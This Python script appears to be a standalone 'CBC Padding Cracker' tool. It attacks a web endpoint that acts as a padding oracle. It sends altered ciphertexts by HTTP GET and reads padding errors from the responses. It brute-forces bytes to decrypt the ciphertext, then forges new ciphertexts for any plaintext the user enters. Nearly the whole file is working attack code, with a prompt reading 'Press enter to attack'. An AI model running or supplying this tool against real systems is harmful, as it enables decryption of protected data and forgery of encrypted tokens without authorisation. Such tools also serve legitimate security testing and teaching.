from utils import *
from math import ceil
import requests
import os



s1 = "Padding Error"
s2 = "File not found"
s3 = "Page OK"

HEX_BYTES = []

for i in range(256):
    hex_value = f"{i:02X}"
    HEX_BYTES.append(hex_value)


def getRessource(ressource):
    try:
        return requests.get(URL+"?"+DATA+ressource).text
    except Exception as e:
        print("Error while sending http reqsuest: ", e)
        exit(1)

def paddingStatus(response):
    if response.__contains__(s1):
        return s1
    elif response.__contains__(s2):
        return s2
    else:
        return s3

def getBlockSize():
    cypher = getNextCypher()

    if (len(cypher)//2)%16 == 8: return 8
    
    test_pad = cypher + cypher[-16*2:]  # 2 letters = 1 byte

    a = getRessource(test_pad)
    if paddingStatus(a) == s1:
        return 16
    else:
        return 8

def hex_to_binary(hex_str):
    decimal_value = int(hex_str, 16)
    binary_str = bin(decimal_value)[2:]
    return binary_str

def getBlocks(block_size, cypher):
    blocks = []
    block = ""
    for k in range(len(cypher)):
        if (k+1)%(block_size*2) == 1 and k != 0:
            blocks.append(block)
            block = ""
        block += cypher[k]
    blocks.append(block)

    return blocks

def blockToCypher(blocks):
    c = ""
    for b in blocks:
        c += b
    return c

def modifyBlock(block, val, blocks, ind):
    assert(len(blocks[block]) > ind and len(blocks) > block and ind > 0)
    pre = blocks[block][:ind-1] 
    if len(blocks[block]) > ind+1:
        su = blocks[block][ind+1:]
        res = pre+val+su
    else:
        res = pre+val

    blocks[block] = res


def guess(c, x, pad, block_size, Pn, Dn):
    # we have x^d = pad (valid padding)
    # hence d = pad^x
    # and we have c^d = plain
    int_x = int(x, 16)
    int_c = int(c, 16)
    int_d = pad ^ int_x

    Pn[block_size-pad], Dn[block_size-pad] = int_c ^ int_d, int_d


def fuzzCk(b, k=0):
    n = len(b)
    pad_step = 1  # always = j+1
    to_print = f"Block: {k+1}\n"
    s = ""
    ok = False
    Pn = [0]*block_size
    Dn = [0]*block_size
    SIZE = block_size*2

    for j in range(SIZE - 1, 0, -2):
        current_val = b[k][j-1:j+1]
        blocks = b.copy()

        # if we are at at least padding 0x02
        for p in range(pad_step-1):
            # we modify d to generate a valid padding
            block_ind = SIZE - 2*p - 1
            valid_padding = Dn[block_size-p-1] ^ (pad_step)
            modifyBlock(k, f"{valid_padding:02X}", blocks, block_ind)
        
        for val in HEX_BYTES:
            blocks_cpy = blocks.copy()

            # now, d values will generate a valid padding
            # we have to bruteforce the next one to have a valid padding
            modifyBlock(k, val, blocks_cpy, j)
            new_cypher = blockToCypher(blocks_cpy)

            # copy of blocks to have a fancy print
            modifyBlock(k, f"{ORANGE}{val}{WHITE}", bcpy:=blocks_cpy.copy(), j)
            printable_cypher = blockToCypher(bcpy)

            # verify wether or not the oracle validated the padding
            status = paddingStatus(getRessource(new_cypher))
            s = f"{status} {printable_cypher} Byte: {block_size-pad_step+1}\n"
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{to_print}{s}")
            if status != s1: # and val != current_val:
                ok = True
                break
        
        to_print += f"{GREEN if ok else RED}{status} {new_cypher} {val if ok else None} Byte {block_size-pad_step+1}{WHITE}\n"
        os.system('cls' if os.name == 'nt' else 'clear')
        if ok:
            guess(c=current_val, x=val, pad=pad_step, block_size=block_size, Pn=Pn, Dn=Dn)
            to_print += f"Found d[{block_size-pad_step+1}]={hex(Dn[block_size-pad_step])} and p[{block_size-pad_step+1}]={hex(Pn[block_size-pad_step])}\n"
        
        print(to_print)

        ok = False
        pad_step += 1   

    return Pn, Dn


def buildBlocks(desired_plain, block_size, DNs, n, plain_len):
    # recall that C1^D2 = P2
    # hence if we want C1^D2 = desired_plain
    # we build C1 as C1 = desired_plain^D2
    
    # add padding to the desired plain text to validate the decryption

    blocks = []
    pad_len = block_size*n - plain_len
    N = block_size
    block = ""
    for k, Dn in enumerate(DNs):
        if k == n-1:
            N = plain_len

        for i in range(N):
            block += f"{ord(desired_plain[block_size*k+i])^Dn[i]:02X}"
        
        if k == n-1:  # if it is le last block, we have to pad the end of it (when the message lenght isn't a multiple of 16)
            for j in range(i+1, i+1+pad_len):
                block += f"{pad_len^Dn[j]:02X}"
        
        blocks.append(block)

    return blocks



ban = """

---------------------------------------------------------------------------------

 ██████╗██████╗  ██████╗    ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗     
██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     
██║     ██████╔╝██║         ██████╔╝███████║██║  ██║██║  ██║██║██╔██╗ ██║██║  ███╗    
██║     ██╔══██╗██║         ██╔═══╝ ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║██║   ██║    
╚██████╗██████╔╝╚██████╗    ██║     ██║  ██║██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝    
 ╚═════╝╚═════╝  ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     
                                                                                      
            ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗                               
            ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                              
            ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝                              
            ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                              
            ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║                              
             ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                              


----------------------------------By @b3liott------------------------------------                                                                                               

"""

if __name__ == "__main__":
    url, method, data, s, block_size = get_args()

    if (m:=method.upper()) not in ["GET", "POST"]:
        log_error("Invalid method, use get or post (upper or lower case)")
        exit(1)

    if m == 'POST':
        print("No implemented yet.")
        exit()

    global URL 
    URL = url

    global DATA
    DATA = data

    print(ban)
    print("Taille des blocks: ", block_size)

    #s = "59873749DC0D3A4ACC7F19D711853685EFCDBFECDF85D6B3AF6171F793CC20B4"
    #s = "2FF5CE2CC953CB34E6C3D2ADB00A6BA40959A8C2F81BC2E70DB268F882F0351613E22C0B42BAB40FE9C2C952288CE25579C35DB94476B12CA5F235DA6F27FE6E"
    
    print("Cypher sample: ", s)
    print("Blocks: ", b:=getBlocks(block_size, s))

    input("Press enter to attack...")

    n = len(b)
    message = ""
    saved_datas = {
        "DNs": [],
        "PNs": []
    }
    _b = ["00"*16] + b
    for i in range(0, n):
        sub_b = _b[0:i+2]
        Pn, Dn = fuzzCk(b=sub_b, k=i)
        saved_datas["DNs"].append(Dn)
        saved_datas["PNs"].append(Pn)
        
        for v in Pn:
            message += chr(v)

    print(f"{GREEN} ----------------------- DECRYPTED MESSAGE: {message} -----------------------{WHITE}")

    while True:
        craft = input("Do you want to craft a custom cypher? Enter your plaintext or type '\\q' to quit: ")
        if craft.lower() == "\\q":
            print("Exiting the program.")
            break
        elif craft:
            desired_plain = craft
            plain_len = len(desired_plain)
            n_blocks_needed = ceil(plain_len / 16)
            if n_blocks_needed < len(saved_datas["DNs"]):
                C1 = buildBlocks(desired_plain, block_size, saved_datas["DNs"][:n_blocks_needed], n_blocks_needed, plain_len)
                C2 = b[:-1]
                new_cypher = blockToCypher(C1 + C2)
                print(f"Crafted Cypher: {new_cypher}")
            else:
                print("Error: can't craft this message with previous cracked data because it's too long.")
        else:
            print("Please enter a valid plaintext or '\\q' to quit.")
